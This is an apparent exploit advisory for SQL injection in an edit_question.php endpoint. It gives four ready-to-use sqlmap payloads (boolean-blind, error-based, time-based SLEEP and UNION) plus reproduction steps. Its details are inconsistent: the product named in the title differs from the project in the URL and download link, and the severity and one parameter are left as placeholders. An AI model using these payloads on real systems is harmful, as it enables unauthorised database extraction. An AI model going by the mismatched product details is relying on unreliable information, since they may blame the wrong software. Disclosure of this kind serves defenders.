# Exploit Title: Engineers Online Portal – SQL Injection in edit_question.php (`http://localhost/niamunozmonitoringsystem/edit_question.php?quiz_question_id=1`)

**Date:** 2025-08-11  
**Exploit Author:** Anonymous  
**Vendor Homepage:** https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html  
**Software Link:** https://www.sourcecodester.com/sites/default/files/download/oretnom23/nia_munoz_monitoring_system.zip  
**Version:** 1.0.7.18  
**Tested on:** PHP 7.4 on Ubuntu 20.04  

---

## Summary

A SQL Injection vulnerability exists in the `edit_question.php` endpoint of **Engineers Online Portal**. Unsanitized user input in the specified parameter is interpolated directly into an SQL query, allowing attackers to infer or extract data and, in some cases, execute stacked/time-based payloads.  
**Back-end DBMS (as detected):** MySQL >= 5.1 (MariaDB fork)  
**CWE:** CWE-89 (SQL Injection)  
**Severity:** High (placeholder — adjust once CVSS is computed)

## Affected Component & Parameter

### Affected Endpoint

- **URL:** `http://localhost/niamunozmonitoringsystem/edit_question.php?quiz_question_id=1`
- **HTTP Method:** GET
- **Vulnerable File:** `edit_question.php`
- **Parameter:** `quiz_question_id`
- **Vector Location:** GET

### Injection Techniques (as identified by sqlmap)
- **Type:** boolean-based blind
  - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
  - **Payload:** `quiz_question_id=1' AND 4572=(SELECT (CASE WHEN (4572=4572) THEN 4572 ELSE (SELECT 4715 UNION SELECT 5553) END))-- -`
- **Type:** error-based
  - **Title:** MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
  - **Payload:** `quiz_question_id=1' AND EXTRACTVALUE(6525,CONCAT(0x5c,0x716b6a7871,(SELECT (ELT(6525=6525,1))),0x717a6b6271))-- XEbY`
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `quiz_question_id=1' AND (SELECT 5464 FROM (SELECT(SLEEP(5)))DAtA)-- pdUV`
- **Type:** UNION query
  - **Title:** Generic UNION query (NULL) - 9 columns
  - **Payload:** 
```
quiz_question_id=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b6a7871,0x72756d6458794d676a7847696256774e796b46447752795068564d54735a507a56584b47724b6a74,0x717a6b6271)-- -
```



## Proof of Concept (Burp Repeater)

![burp-repeater-poc](poc.png)

## SQLMap Summary

![sqlmap-summary](sqlmap_summary.png)



## Technical Description

The vulnerable parameter is reflected into the SQL statement without proper validation or prepared statements. Boolean-based blind, time-based blind (SLEEP), and/or UNION-based vectors were verified by sqlmap. This enables database enumeration and potential data exfiltration under the privileges of the application’s DB user.

## Impact

- Enumeration of database schemas, tables, and rows  
- Exposure of sensitive user/operational data  
- Potential lateral movement if credentials or session material are stored in DB

## Steps to Reproduce

1. Browse to `http://localhost/niamunozmonitoringsystem/edit_question.php?quiz_question_id=1`.  
2. Intercept the request and inject the provided payload(s) into parameter `edit_question.php?&<param>=...`.  
3. Observe conditional responses / time delays / injected row reflections per technique above.  
4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.

## Vulnerable Code (Screenshot)

![vulnerable-code](code_snippet.png)


References
OWASP: SQL Injection Prevention Cheat Sheet

CWE-89: SQL Injection
